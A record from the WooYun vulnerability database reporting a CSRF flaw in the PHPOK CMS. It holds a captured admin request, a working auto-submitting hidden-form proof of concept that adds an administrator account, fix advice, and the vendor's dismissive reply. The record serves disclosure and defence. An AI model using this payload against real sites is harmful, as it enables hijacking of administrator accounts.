{"id": 56938, "wybug_id": "wooyun-2014-055782", "wybug_title": "PHPOK CSRF获取管理员权限", "wybug_corp": "phpok.com", "wybug_author": "三只小潴", "wybug_date": "2014-04-11 15:28", "wybug_open_date": "2014-05-26 15:29", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向公众公开  简要描述： PHPOK CSRF获取管理员权限 详细说明：  PHPOK CSRF获取管理员权限   漏洞证明：  测试环境（PHPOK）：\n\n添加用户：\n\n抓包抓到如下内容：\nPOST /phpok/admin.php?c=admin&f=save HTTP/1.1Host: www.evil.comProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://www.evil.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://www.evil.com/phpok/admin.php?c=admin&f=setAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSION=c003810ffea32e03358eb66d6a1a81cbid=&account=poc&pass=poc123&email=poc%40qq.com&status=1&if_system=1\n发现没有加token，查看源码也没有看到判断referer。 所以可能存在CSRF，于是构造如下POC：\n<div style=\"display:none\"><form action=\"http://www.evil.com/phpok/admin.php?c=admin&f=save\" id=\"poc\" name=\"poc\" method=\"post\"><input type=\"hidden\" name=\"id\" value=\"\"/><input type=\"hidden\" name=\"account\" value=\"\"/><input type=\"hidden\" name=\"pass\" value=\"\"/><input type=\"hidden\" name=\"email\" value=\"\"/><input type=\"hidden\" name=\"status\" value=\"\"/><input type=\"hidden\" name=\"if_system\" value=\"\"/><input type=\"submit\" name=\"up\" value\"submit\"/></form><script>var t = document.poc;t.account.value=\"evil\";t.pass.value=\"evil\";t.email.value=\"evil@qq.com\";t.status.value=\"1\";t.if_system.value=\"1\";document.poc.submit();</script></div>\n打开POC页面前：\n\n打开后：\n\n为此添加管理员成功。。。理论上是通杀所有版本的。。。   修复方案：  1. 判断referer来源，根据业务的逻辑进行referer的过滤。2. 添加一次性token，同时注意随机不可预测性！   版权声明：转载请注明来源 三只小潴@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-04-11 15:55 厂商回复： 您好，朋友，我真心不懂您说的这个漏洞噢。因为你的这个测试是需要已经是管理员登录过后才能执行的操作~。这个我没办法重现这个漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-11 20:34 |    \t\t三只小潴 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:3        | 纯属小白，求大牛关注。。。)\t\t \n  。。。 难道厂商没有做安全的人么？ CSRF不知道是什么洞？    \n     2014-05-26 15:36 |    \t\tphpok企业站(乌云厂商)\t\t \n  现在才慢慢正式化！人都还没有招齐全呢:(    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}